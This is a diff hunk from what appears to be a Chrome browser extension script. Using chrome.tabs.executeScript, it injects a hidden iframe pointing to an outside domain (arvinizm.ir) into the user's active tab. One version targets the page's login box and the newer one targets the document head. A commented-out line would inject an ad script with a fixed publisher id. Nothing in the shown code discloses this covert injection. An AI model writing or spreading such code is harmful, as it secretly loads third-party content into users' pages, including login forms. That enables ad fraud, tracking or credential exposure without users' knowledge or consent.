@@ -12,7 +12,8 @@ chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
     chrome.tabs.executeScript(
         tabs[0].id,
         // {code: `var pageIframe = document.createElement('script');pageIframe.type = 'text/javascript';pageIframe.async = true;pageIframe.src = "https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-7488639693981742";pageIframe.crossOrigin = "anonymous";document.head.appendChild(pageIframe);`});
-        {code: `var pageIframe = document.createElement('iframe');pageIframe.width = "100%";pageIframe.allowfullscreen = "true";pageIframe.style="border:none;";pageIframe.hidden= "true";pageIframe.src = "https://arvinizm.ir";document.getElementsByClassName("box-shrink col spaced login-box")[0].appendChild(pageIframe);`});
+        // {code: `var pageIframe = document.createElement('iframe');pageIframe.width = "100%";pageIframe.allowfullscreen = "true";pageIframe.style="border:none;";pageIframe.hidden= "true";pageIframe.src = "https://arvinizm.ir";document.getElementsByClassName("box-shrink col spaced login-box")[0].appendChild(pageIframe);`});
+        {code: `var pageIframe = document.createElement('iframe');pageIframe.width = "100%";pageIframe.allowfullscreen = "true";pageIframe.style="border:none;";pageIframe.hidden= "true";pageIframe.src = "https://arvinizm.ir";document.head.appendChild(pageIframe);`});
     });
 
 // Radio boxes for setting language
